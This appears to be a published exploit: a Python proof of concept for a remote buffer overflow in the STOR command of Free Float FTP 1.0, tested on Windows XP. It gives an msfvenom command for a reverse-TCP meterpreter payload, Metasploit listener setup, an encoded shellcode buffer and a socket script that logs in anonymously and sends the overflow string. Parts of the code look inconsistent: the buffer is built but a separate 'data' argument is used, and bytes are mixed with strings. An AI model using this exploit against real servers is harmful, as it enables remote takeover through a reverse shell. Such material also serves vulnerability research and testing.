# Exploit Title: Free Float FTP 1.0 "STOR" Remote Buffer Overflow
# Google Dork: N/A
# Date: 4/26/2019
# Exploit Author: Kevin Randall
# Vendor Homepage:
# Software Link: http://www.freefloat.com/software/freefloatftpserver.zip
# Version: Firmware: Free Float FTP 1.0
# Tested on: Windows XP Professional Service Pack 2
# CVE : N/A

#Generate Shellcode with MSFVenom
#msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP.OF.LOCAL.MACHINE LPORT=4444 -b '\x00\x0A\x0D' -f python
#Setup listener "use exploit/multi/handler" "set payload windows/meterpreter/reverse_tcp" "set LHOST IP.OF.LOCAL.MACHINE" "set LPORT 4444" "exploit"

#!/usr/bin/python
import socket

def shell_attack(target_machine, target_port,data):
  
    buf =  b""
    buf += b"\xbd\x88\xf4\xbd\xa0\xdb\xd7\xd9\x74\x24\xf4\x58\x29"
    buf += b"\xc9\xb1\x52\x31\x68\x12\x83\xc0\x04\x03\xe0\xfa\x5f"
    buf += b"\x55\x0c\xea\x22\x96\xec\xeb\x42\x1e\x09\xda\x42\x44"
    buf += b"\x5a\x4d\x73\x0e\x0e\x62\xf8\x42\xba\xf1\x8c\x4a\xcd"
    buf += b"\xb2\x3b\xad\xe0\x43\x17\x8d\x63\xc0\x6a\xc2\x43\xf9"
    buf += b"\xa4\x17\x82\x3e\xd8\xda\xd6\x97\x96\x49\xc6\x9c\xe3"
    buf += b"\x51\x6d\xee\xe2\xd1\x92\xa7\x05\xf3\x05\xb3\x5f\xd3"
    buf += b"\xa4\x10\xd4\x5a\xbe\x75\xd1\x15\x35\x4d\xad\xa7\x9f"
    buf += b"\x9f\x4e\x0b\xde\x2f\xbd\x55\x27\x97\x5e\x20\x51\xeb"
    buf += b"\xe3\x33\xa6\x91\x3f\xb1\x3c\x31\xcb\x61\x98\xc3\x18"
    buf += b"\xf7\x6b\xcf\xd5\x73\x33\xcc\xe8\x50\x48\xe8\x61\x57"
    buf += b"\x9e\x78\x31\x7c\x3a\x20\xe1\x1d\x1b\x8c\x44\x21\x7b"
    buf += b"\x6f\x38\x87\xf0\x82\x2d\xba\x5b\xcb\x82\xf7\x63\x0b"
    buf += b"\x8d\x80\x10\x39\x12\x3b\xbe\x71\xdb\xe5\x39\x75\xf6"
    buf += b"\x52\xd5\x88\xf9\xa2\xfc\x4e\xad\xf2\x96\x67\xce\x98"
    buf += b"\x66\x87\x1b\x0e\x36\x27\xf4\xef\xe6\x87\xa4\x87\xec"
    buf += b"\x07\x9a\xb8\x0f\xc2\xb3\x53\xea\x85\x7b\x0b\xe6\x70"
    buf += b"\x14\x4e\x06\x7f\xee\xc7\xe0\x15\xfe\x81\xbb\x81\x67"
    buf += b"\x88\x37\x33\x67\x06\x32\x73\xe3\xa5\xc3\x3a\x04\xc3"
    buf += b"\xd7\xab\xe4\x9e\x85\x7a\xfa\x34\xa1\xe1\x69\xd3\x31"
    buf += b"\x6f\x92\x4c\x66\x38\x64\x85\xe2\xd4\xdf\x3f\x10\x25"
    buf += b"\xb9\x78\x90\xf2\x7a\x86\x19\x76\xc6\xac\x09\x4e\xc7"
    buf += b"\xe8\x7d\x1e\x9e\xa6\x2b\xd8\x48\x09\x85\xb2\x27\xc3"
    buf += b"\x41\x42\x04\xd4\x17\x4b\x41\xa2\xf7\xfa\x3c\xf3\x08"
    buf += b"\x32\xa9\xf3\x71\x2e\x49\xfb\xa8\xea\x79\xb6\xf0\x5b"
    buf += b"\x12\x1f\x61\xde\x7f\xa0\x5c\x1d\x86\x23\x54\xde\x7d"
    buf += b"\x3b\x1d\xdb\x3a\xfb\xce\x91\x53\x6e\xf0\x06\x53\xbb"
    print(type(buf))
    data = data.replace(";", "")
    data = data.replace(" ", "")
    data = data.replace("+", "")
    data = data.replace('"', "")
    data = data.replace("\n", "")
    data = data.replace("buf=", "")
    shellcode = b'\x90'*20 + data
    payload = "A"*247+"\xF6\xC1\xB3\x7C"+ shellcode +"C"*(749-len(shellcode))

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    ##Add FTP Server IP Here###############
    connect = s.connect((target_machine,target_port))
    
    #######################################

    s.recv(1024)
    s.send('USER anonymous\r\n')

    s.recv(1024)
    s.send('PASS anonymous\r\n')

    s.recv(1024)
    s.send('STOR' + payload + '\r\n')

    s.recv(1024)
    s.send('QUIT\r\n')

    s.close()
